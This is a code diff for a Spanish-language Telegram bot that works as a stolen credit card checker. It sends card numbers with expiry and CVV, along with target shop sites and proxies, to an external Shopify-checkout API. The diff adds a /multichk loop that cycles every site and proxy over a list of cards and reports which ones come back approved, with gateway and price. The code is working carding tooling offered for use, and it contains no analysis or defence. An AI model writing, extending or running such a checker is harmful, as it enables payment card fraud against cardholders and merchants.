@@ -5,6 +5,7 @@ const fs = require('fs');
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const OWNER_ID = Number(process.env.OWNER_ID);
+const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';
 
 if (!BOT_TOKEN) {
   console.error('BOT_TOKEN no definido');
@@ -17,33 +18,43 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const DATA_FILE = './data.json';
 let data = fs.existsSync(DATA_FILE)
   ? JSON.parse(fs.readFileSync(DATA_FILE))
-  : { activeSite: null, activeProxy: null };
+  : { sites: [], proxies: [], activeSite: null, activeProxy: null };
 
 function saveData() {
   fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 }
 
-const running = {};
+function isOwner(id) {
+  return id === OWNER_ID;
+}
+
+/* ================== RUNTIME ================== */
+const running = {}; // chatId => boolean
 
 /* ================== API ================== */
 async function callChkAPI({ site, cc, proxy }) {
   try {
-    const res = await axios.get(
-      'https://auto-shopify-api-production.up.railway.app/index.php',
-      { params: { site, cc, proxy }, timeout: 30000 }
-    );
+    const res = await axios.get(API_BASE, {
+      params: { site, cc, proxy },
+      timeout: 30000
+    });
 
     const d = res.data || {};
     const response = String(d.Response || '').toUpperCase();
 
     return {
       approved: response.includes('APPRO'),
-      response,
+      response: d.Response || 'NO_RESPONSE',
       gateway: d.Gateway || 'N/A',
-      price: d.Price || 'N/A'
+      price: d.Price || 'N/A',
+      cc
     };
   } catch {
-    return { approved: false, response: 'API_ERROR' };
+    return {
+      approved: false,
+      response: 'API_ERROR',
+      cc
+    };
   }
 }
 
@@ -54,34 +65,23 @@ bot.onText(/\/start/, (msg) => {
 `🤖 Bot activo
 
 Configura:
-• /setsite https://site.com
-• /setproxy ip:port:user:pass
+• data.json → sites[] y proxies[]
 
-Luego:
-• /chk cc|mm|yy|cvv
+Luego usa:
+• /multichk
 • /stop`
   );
 });
 
-/* ================== CONFIG ================== */
-bot.onText(/\/setsite (.+)/, (msg, match) => {
-  data.activeSite = match[1].trim();
-  saveData();
-  bot.sendMessage(msg.chat.id, `🌐 Site activo:\n${data.activeSite}`);
-});
-
-bot.onText(/\/setproxy (.+)/, (msg, match) => {
-  data.activeProxy = match[1].trim();
-  saveData();
-  bot.sendMessage(msg.chat.id, `🧰 Proxy activo:\n${data.activeProxy}`);
-});
-
-/* ================== CHK ================== */
-bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
+/* ================== MULTI-CHK SECUENCIAL ================== */
+bot.onText(/\/multichk([\s\S]*)/, async (msg, match) => {
   const chatId = msg.chat.id;
 
-  if (!data.activeSite || !data.activeProxy) {
-    return bot.sendMessage(chatId, '❌ Configura site y proxy primero');
+  if (!data.sites.length || !data.proxies.length) {
+    return bot.sendMessage(
+      chatId,
+      '❌ Añade sites y proxies en data.json primero'
+    );
   }
 
   const input = match[1].trim();
@@ -95,42 +95,61 @@ bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
   let approved = 0;
   let declined = 0;
 
-  const progressMsg = await bot.sendMessage(chatId, `⏳ 0/${ccs.length}`);
+  const total =
+    data.sites.length * data.proxies.length * ccs.length;
+  let done = 0;
 
-  for (let i = 0; i < ccs.length; i++) {
-    if (!running[chatId]) break;
+  const progressMsg = await bot.sendMessage(
+    chatId,
+    `⏳ 0/${total}`
+  );
 
-    const cc = ccs[i];
-    const r = await callChkAPI({
-      site: data.activeSite,
-      cc,
-      proxy: data.activeProxy
-    });
+  for (const site of data.sites) {
+    for (const proxy of data.proxies) {
+      for (const cc of ccs) {
+        if (!running[chatId]) break;
 
-    if (r.approved) {
-      approved++;
-      await bot.sendMessage(chatId,
+        const r = await callChkAPI({ site, cc, proxy });
+
+        if (r.approved) {
+          approved++;
+          await bot.sendMessage(
+            chatId,
 `━━━━━━━━━━━━━━
-💳 ${cc}
+💳 ${r.cc}
 🏪 ${r.gateway}
 💰 ${r.price}
-✅ ${r.response}`);
-    } else {
-      declined++;
-    }
+✅ ${r.response}`
+          );
+        } else {
+          declined++;
+        }
 
-    await bot.editMessageText(
-      `⏳ ${i + 1}/${ccs.length}\n✅ ${approved} ❌ ${declined}`,
-      { chat_id: chatId, message_id: progressMsg.message_id }
-    );
+        done++;
+        try {
+          await bot.editMessageText(
+            `⏳ ${done}/${total}\n✅ ${approved} ❌ ${declined}`,
+            {
+              chat_id: chatId,
+              message_id: progressMsg.message_id
+            }
+          );
+        } catch {}
+      }
+      if (!running[chatId]) break;
+    }
+    if (!running[chatId]) break;
   }
 
   running[chatId] = false;
 
-  bot.sendMessage(chatId,
+  bot.sendMessage(
+    chatId,
 `✅ Finalizado
+Total: ${total}
 Aprobadas: ${approved}
-Rechazadas: ${declined}`);
+Rechazadas: ${declined}`
+  );
 });
 
 /* ================== STOP ================== */
